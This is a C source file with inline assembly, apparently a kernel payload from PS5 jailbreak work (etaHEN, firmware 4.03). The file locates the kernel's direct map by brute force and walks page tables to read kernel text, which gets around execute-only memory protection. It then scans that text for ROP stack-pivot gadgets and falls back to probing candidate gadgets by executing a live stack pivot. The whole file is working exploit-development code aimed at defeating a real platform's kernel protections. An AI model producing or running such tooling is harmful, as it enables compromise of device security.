#include <stdint.h>

/*
 * pivot_scan_safe v5 — DMAP-based ktext gadget scanner
 *
 * etaHEN reads ktext through DMAP (kernel_copyout of dmap_base+pa).
 * GMET may not be enforced on FW 4.03, making ktext readable via DMAP.
 *
 * Strategy:
 *   1. Read CR3 → PML4 physical address
 *   2. Determine DMAP base (try 0xFFFFF80000000000, FreeBSD standard)
 *   3. Walk page tables for ktext pages via DMAP
 *   4. Read ktext bytes via DMAP (pcb_onfault protected)
 *   5. Scan for gadget patterns: 48 94 C3, 5C C3, C9 C3, etc.
 *   6. If DMAP reads fail: fall back to safe single-probe mode
 *
 * fw_ver encoding:
 *   0 = full scan (DMAP read + pattern match)
 *   0x0001XXXX = single probe fallback (apic_idx in low byte, delta in byte 1)
 *
 * Output layout (uint64_t indices):
 *   [0]   magic "PVS5" (0x50565335) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   cr3 value
 *   [4]   dmap_base (confirmed, or default if not found)
 *   [5]   td_pcb
 *   [6]   phase (1=dmap_test, 2=pagewalk, 3=ktext_read, 4=done)
 *   -- Phase 0+1: diagnostics + DMAP discovery --
 *   [7]   safe_read8 diag (0xAAAA0001=ok, 0xDEAD0000=fault)
 *   [8]   (indices_tried<<32) | 0xD0000000 | found_idx  [packed, always non-zero]
 *   [9]   pml4_dmap_entry (DMAP's own PML4 entry, 0 if not found)
 *   [10]  first_success_val (first readable PML4 value)
 *   [11]  error code if DMAP not found (0xDEAD0001)
 *   -- Phase 2-3: ktext access --
 *   [15]  pml4_ktext_entry
 *   [16]  first_ktext_page_pa
 *   [17]  error code if walk/read fails (0xDEAD0002/3)
 *   [18]  first 8 bytes of ktext via DMAP
 *   -- Phase 4: scan results --
 *   [19]  num_pages_scanned / kdata_pa (if XOM)
 *   [20]  num_gadgets_found / kdata_test (if XOM)
 *   [21]  first xchg_rsp_rax_ret offset (ktext-relative)
 *   [22]  first pop_rsp_ret offset
 *   [23]  first leave_ret offset
 *   [24]  num additional gadgets recorded
 *   [25..60] gadget offsets (type in bits 48-51: 1=xchg,2=pop,3=mov)
 *   [63]  sentinel 0xdeadbeefcafe0025
 */

#define MAGIC_PVS5    0x50565335
#define TD_PCB        0x3f8
#define PCB_ONFAULT   0x108

#define OFF_NOP_RET        (-0x9d20ca)
#define APIC_OPS_OFF_KTEXT  0x1934AC8
#define NUM_APIC_OPS        28

/* Standard FreeBSD amd64 DMAP base */
#define DMAP_BASE_DEFAULT   0xFFFFF80000000000ULL

/* Page table constants */
#define PML4_SHIFT    39
#define PDPT_SHIFT    30
#define PD_SHIFT      21
#define PT_SHIFT      12
#define PT_INDEX_MASK 0x1FF
#define PAGE_MASK     0xFFFFFFFFF000ULL  /* PA mask from PTE */
#define PTE_PRESENT   0x1
#define PTE_PS        0x80  /* Page Size (2MB/1GB page) */

#define ENTRY_STK_SIZE    32
#define MAX_GADGETS       14

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read_cr3(void)
{
    uint64_t cr3;
    __asm__ volatile("movq %%cr3, %0" : "=r"(cr3));
    return cr3;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

/* Shared state for pcb_onfault */
static volatile uint64_t saved_rsp;
static volatile uint64_t onfault_ptr;
static volatile int fault_flag;

/* Safe read: returns 1 on success, 0 on fault */
static int safe_read8(uint64_t addr, uint64_t* val)
{
    fault_flag = 0;
    *val = 0;

    __asm__ volatile(
        /* Arm pcb_onfault */
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%%r14)\n\t"
        "movq %%rsp, saved_rsp(%%rip)\n\t"

        /* Try the read */
        "movq (%[addr]), %%rax\n\t"
        "movq %%rax, (%[out])\n\t"

        /* Success path */
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"
        "jmp 1f\n\t"

        /* Fault recovery */
        "2:\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movl $1, fault_flag(%%rip)\n\t"

        "1:\n\t"
        :
        : [addr] "r"(addr), [out] "r"(val)
        : "rax", "rcx", "r14", "memory", "cc"
    );

    return fault_flag == 0;
}

/* Walk page tables to convert VA → PA. Returns 0 on failure. */
static uint64_t va_to_pa(uint64_t va, uint64_t dmap_base, uint64_t cr3)
{
    uint64_t pml4_pa = cr3 & PAGE_MASK;
    uint64_t val;

    /* PML4 entry */
    uint64_t pml4e_addr = dmap_base + pml4_pa + ((va >> PML4_SHIFT) & PT_INDEX_MASK) * 8;
    if (!safe_read8(pml4e_addr, &val) || !(val & PTE_PRESENT))
        return 0;

    /* PDPT entry */
    uint64_t pdpt_pa = val & PAGE_MASK;
    uint64_t pdpte_addr = dmap_base + pdpt_pa + ((va >> PDPT_SHIFT) & PT_INDEX_MASK) * 8;
    if (!safe_read8(pdpte_addr, &val) || !(val & PTE_PRESENT))
        return 0;

    /* 1GB page? */
    if (val & PTE_PS)
        return (val & 0xFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);

    /* PD entry */
    uint64_t pd_pa = val & PAGE_MASK;
    uint64_t pde_addr = dmap_base + pd_pa + ((va >> PD_SHIFT) & PT_INDEX_MASK) * 8;
    if (!safe_read8(pde_addr, &val) || !(val & PTE_PRESENT))
        return 0;

    /* 2MB page? */
    if (val & PTE_PS)
        return (val & 0xFFFFFFE00000ULL) | (va & 0x1FFFFFULL);

    /* PT entry (4KB page) */
    uint64_t pt_pa = val & PAGE_MASK;
    uint64_t pte_addr = dmap_base + pt_pa + ((va >> PT_SHIFT) & PT_INDEX_MASK) * 8;
    if (!safe_read8(pte_addr, &val) || !(val & PTE_PRESENT))
        return 0;

    return (val & PAGE_MASK) | (va & 0xFFFULL);
}

/* Scan a buffer for a byte pattern. Returns offset or -1. */
static int find_pattern(const uint8_t* buf, int buflen,
                        const uint8_t* pat, int patlen)
{
    for (int i = 0; i <= buflen - patlen; i++) {
        int match = 1;
        for (int j = 0; j < patlen; j++) {
            if (buf[i + j] != pat[j]) { match = 0; break; }
        }
        if (match) return i;
    }
    return -1;
}

/* ---- Fallback: execution-based single probe (from v3) ---- */
static volatile uint64_t pivot_chain[8];
static volatile uint64_t entry_stk[ENTRY_STK_SIZE];
static volatile int probe_result;

__attribute__((naked, used))
static void pivot_landing(void)
{
    __asm__ volatile(
        "movq $1, probe_result(%%rip)\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"
        "jmp .Lprobe_done\n\t"
        ::: "memory"
    );
}

static int do_probe(uint64_t candidate)
{
    entry_stk[0] = candidate;
    probe_result = 0;

    __asm__ volatile(
        "leaq entry_stk(%%rip), %%rdx\n\t"
        "leaq 1f(%%rip), %%rcx\n\t"
        ".set j, 1\n\t"
        ".rept 31\n\t"
        "movq %%rcx, (j*8)(%%rdx)\n\t"
        ".set j, j+1\n\t"
        ".endr\n\t"

        "movq onfault_ptr(%%rip), %%r14\n\t"
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%%r14)\n\t"
        "movq %%rsp, saved_rsp(%%rip)\n\t"

        "leaq pivot_chain(%%rip), %%rax\n\t"
        "leaq pivot_chain(%%rip), %%rbp\n\t"

        "leaq entry_stk(%%rip), %%rsp\n\t"
        "retq\n\t"

        "1:\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"
        "jmp .Lprobe_done\n\t"

        "2:\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movl $2, probe_result(%%rip)\n\t"

        ".globl .Lprobe_done\n\t"
        ".Lprobe_done:\n\t"
        :
        :
        : "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11", "r14", "r15",
          "rbp", "memory", "cc"
    );

    return probe_result;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    for (int i = 0; i < 64; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t nop_ret = kdata_base + OFF_NOP_RET;

    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);

    if (!td_pcb) {
        out32[0] = MAGIC_PVS5;
        out32[1] = 0xFF;
        out[63] = 0xdeadbeefcafe0025ULL;
        return 0;
    }

    onfault_ptr = td_pcb + PCB_ONFAULT;

    uint64_t cr3 = read_cr3();
    uint64_t dmap_base = DMAP_BASE_DEFAULT;

    /* Header */
    out32[0] = MAGIC_PVS5;
    out32[1] = 0xAAAA;   /* in-progress */
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = cr3;
    out[4] = dmap_base;
    out[5] = td_pcb;
    out[6] = 1;  /* phase 1: DMAP test */

    /* ========== Phase 0: Verify safe_read8 works ========== */

    /* Test with kdata_base — we know this is readable (we read td_pcb from it) */
    uint64_t diag_val = 0;
    int diag_ok = safe_read8(kdata_base, &diag_val);
    out[7] = diag_ok ? 0xAAAA0001 : 0xDEAD0000;  /* safe_read8 diagnostic */

    if (!diag_ok) {
        out[8] = 0xDEAD0000;
        out32[1] = 0x0003;
        out[63] = 0xdeadbeefcafe0025ULL;
        return 0;
    }

    /* ========== Phase 1: Find DMAP base by brute-force ========== */

    uint64_t pml4_pa = cr3 & PAGE_MASK;
    int dmap_accessible = 0;

    /*
     * DMAP maps all physical RAM at a fixed VA base aligned to 512GB.
     * Scan kernel-half PML4 indices 256..509.
     * For each candidate, try reading the ktext PML4 entry (known-present)
     * through that candidate DMAP mapping. If read succeeds + entry present,
     * cross-validate by reading the candidate's own PML4 entry.
     */
    uint64_t pml4_dmap_entry = 0;
    uint32_t found_idx = 0;
    uint32_t indices_tried = 0;
    uint64_t first_success_val = 0;

    uint64_t ktext_pml4_idx = (ktext_base >> PML4_SHIFT) & PT_INDEX_MASK;

    for (uint32_t idx = 256; idx < 510; idx++) {
        uint64_t candidate = 0xFFFF000000000000ULL | ((uint64_t)idx << PML4_SHIFT);
        uint64_t test_addr = candidate + pml4_pa + ktext_pml4_idx * 8;
        uint64_t entry = 0;

        indices_tried++;

        if (safe_read8(test_addr, &entry)) {
            if (!first_success_val) first_success_val = entry;

            if (entry & PTE_PRESENT) {
                /* Cross-validate: read pml4[idx] (DMAP's own entry) */
                uint64_t self_addr = candidate + pml4_pa + idx * 8;
                uint64_t self_entry = 0;
                if (safe_read8(self_addr, &self_entry) && (self_entry & PTE_PRESENT)) {
                    dmap_base = candidate;
                    pml4_dmap_entry = self_entry;
                    found_idx = idx;
                    dmap_accessible = 1;
                    break;
                }
            }
        }
    }

    /* Pack DMAP discovery results densely right after safe_read8 diag.
     * Slot 8 is guaranteed non-zero (indices_tried >= 1 + marker bit). */
    out[4]  = dmap_base;
    out[8]  = ((uint64_t)indices_tried << 32) | 0xD0000000ULL | found_idx;
    out[9]  = pml4_dmap_entry;       /* DMAP's own PML4 entry (0 if not found) */
    out[10] = first_success_val;     /* first readable PML4 value */

    if (!dmap_accessible) {
        out[11] = 0xDEAD0001;
        out32[1] = 0x0003;  /* partial result */
        out[63] = 0xdeadbeefcafe0025ULL;
        return 0;
    }

    /* Read PML4 entry for ktext region (now using confirmed DMAP) */
    uint64_t pml4_ktext_addr = dmap_base + pml4_pa + ktext_pml4_idx * 8;
    uint64_t pml4_ktext_entry = 0;
    safe_read8(pml4_ktext_addr, &pml4_ktext_entry);
    out[15] = pml4_ktext_entry;

    /* ========== Phase 2: Walk page tables for ktext ========== */
    out[6] = 2;

    /* Get PA of first ktext page */
    uint64_t first_ktext_pa = va_to_pa(ktext_base, dmap_base, cr3);
    out[16] = first_ktext_pa;

    if (!first_ktext_pa) {
        out[17] = 0xDEAD0002;  /* page walk failed */
        out32[1] = 0x0003;
        out[63] = 0xdeadbeefcafe0025ULL;
        return 0;
    }

    /* ========== Phase 3: Try reading ktext through DMAP ========== */
    out[6] = 3;

    uint64_t ktext_dmap_addr = dmap_base + first_ktext_pa;
    uint64_t test_val = 0;
    int read_ok = safe_read8(ktext_dmap_addr, &test_val);
    out[18] = test_val;  /* first 8 bytes of ktext via DMAP */

    if (!read_ok) {
        out[17] = 0xDEAD0003;  /* DMAP read of ktext faulted — XOM enforced */

        /* Try a known-readable kdata page for comparison */
        uint64_t kdata_pa = va_to_pa(kdata_base, dmap_base, cr3);
        uint64_t kdata_test = 0;
        safe_read8(dmap_base + kdata_pa, &kdata_test);
        out[19] = kdata_pa;        /* kdata PA */
        out[20] = kdata_test;      /* kdata bytes via DMAP (should work) */

        out32[1] = 0x0003;  /* partial: DMAP works but ktext XOM enforced */
        out[63] = 0xdeadbeefcafe0025ULL;
        return 0;
    }

    /* ========== DMAP ktext read WORKS! Scan for gadgets ========== */

    /* Gadget patterns */
    static const uint8_t pat_xchg_rsp_rax[] = { 0x48, 0x94, 0xC3 };
    static const uint8_t pat_pop_rsp_ret[]   = { 0x5C, 0xC3 };
    static const uint8_t pat_leave_ret[]     = { 0xC9, 0xC3 };
    static const uint8_t pat_mov_rsp_rax[]   = { 0x48, 0x89, 0xC4, 0xC3 };

    uint32_t num_pages = 0;
    uint32_t num_gadgets = 0;
    uint64_t first_xchg = 0, first_pop_rsp = 0, first_leave = 0;
    uint32_t gadget_slot = 25;  /* output slots 25..60 for additional gadgets */

    /* Scan ktext: 4KB at a time, up to 20MB (0x1400000 bytes / 5120 pages) */
    uint64_t ktext_size = 0x1400000;  /* 20MB, conservative */

    for (uint64_t off = 0; off < ktext_size; off += 0x1000) {
        uint64_t page_va = ktext_base + off;
        uint64_t page_pa = va_to_pa(page_va, dmap_base, cr3);

        if (!page_pa)
            continue;  /* unmapped page */

        /* Read 4KB page via DMAP, 8 bytes at a time */
        uint8_t buf[64];  /* read in chunks to save stack */
        int page_ok = 1;

        for (int chunk = 0; chunk < 0x1000; chunk += 64) {
            /* Read 64 bytes (8 qwords) */
            for (int q = 0; q < 64; q += 8) {
                uint64_t tmp;
                if (!safe_read8(dmap_base + page_pa + chunk + q, &tmp)) {
                    page_ok = 0;
                    break;
                }
                /* Store bytes */
                for (int b = 0; b < 8; b++)
                    buf[q + b] = (uint8_t)(tmp >> (b * 8));
            }

            if (!page_ok) break;

            /* Scan this 64-byte chunk for patterns */
            /* Need to also check across chunk boundaries — skip for now,
               catch most gadgets within chunks */
            int pos;

            pos = find_pattern(buf, 64, pat_xchg_rsp_rax, 3);
            if (pos >= 0) {
                uint64_t goff = off + chunk + pos;
                if (!first_xchg) first_xchg = goff;
                if (gadget_slot <= 60) out[gadget_slot++] = goff | (1ULL << 48);
                num_gadgets++;
            }

            pos = find_pattern(buf, 64, pat_pop_rsp_ret, 2);
            if (pos >= 0) {
                uint64_t goff = off + chunk + pos;
                if (!first_pop_rsp) first_pop_rsp = goff;
                if (gadget_slot <= 60) out[gadget_slot++] = goff | (2ULL << 48);
                num_gadgets++;
            }

            pos = find_pattern(buf, 64, pat_leave_ret, 2);
            if (pos >= 0) {
                uint64_t goff = off + chunk + pos;
                if (!first_leave) first_leave = goff;
                /* Don't record all leave;ret — too many. Just count. */
                num_gadgets++;
            }

            pos = find_pattern(buf, 64, pat_mov_rsp_rax, 4);
            if (pos >= 0) {
                uint64_t goff = off + chunk + pos;
                if (gadget_slot <= 60) out[gadget_slot++] = goff | (3ULL << 48);
                num_gadgets++;
            }
        }

        if (page_ok) num_pages++;

        /* Live progress */
        out[19] = num_pages;
        out[20] = num_gadgets;
    }

    out[6]  = 4;  /* phase 4: done */
    out[19] = num_pages;
    out[20] = num_gadgets;
    out[21] = first_xchg;
    out[22] = first_pop_rsp;
    out[23] = first_leave;
    out[24] = gadget_slot - 25;  /* num additional gadgets recorded */

    out32[1] = (first_xchg || first_pop_rsp) ? 0x0002 : 0x0001;
    out[63] = 0xdeadbeefcafe0025ULL;
    return 0;
}
